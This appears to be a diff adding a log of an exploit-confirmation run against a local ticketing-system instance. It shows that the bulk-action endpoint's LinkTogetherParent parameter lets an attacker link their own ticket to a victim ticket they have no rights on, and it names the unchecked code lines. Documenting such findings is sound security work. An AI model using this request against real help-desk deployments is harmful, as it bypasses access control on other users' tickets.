@@ -1,0 +1,13 @@
+==========================================================================
+VULN-002: AgentTicketBulk;Do links/merges into an unchecked target ticket
+Target: http://localhost:25114
+[INFO] perm checked on SOURCES only (pm:806/1474); MergeTo/LinkTogetherParent target unchecked (pm:1214)
+==========================================================================
+[SETUP] attacker att002_99bdfa76 (rw on Raw); source ticket TID=68 TN=2026092910000676
+[SETUP] victim ticket TID=69 TN=2026092910000685 in off-limits queue vq002_99bdfa76
+[PROOF] attacker perm on source 68={'ro': 1, 'note': 1, 'rw': 1}; on victim 69={'ro': 0, 'note': 0, 'rw': 0}
+[STEP] POST Bulk Do: selected source 68, LinkTogetherParent=2026092910000685 (victim number)
+[INFO] Bulk HTTP 200
+[PROOF] link_relation rows referencing victim 69 as parent of source 68: [['69', '68']]
+[OK] exploit confirmed — attacker (no rights on victim 69) created a ParentChild link with the off-limits victim as parent of its own ticket 68 via LinkTogetherParent — object-level authorization on the bulk merge/link target is absent.
+==> VULN-002: CONFIRMED — attacker (no rights on victim 69) created a ParentChild link with the off-limits victim as parent of its own ticket 68 via LinkTogetherParent — object-level authorization on the bulk merge/link target is absent.
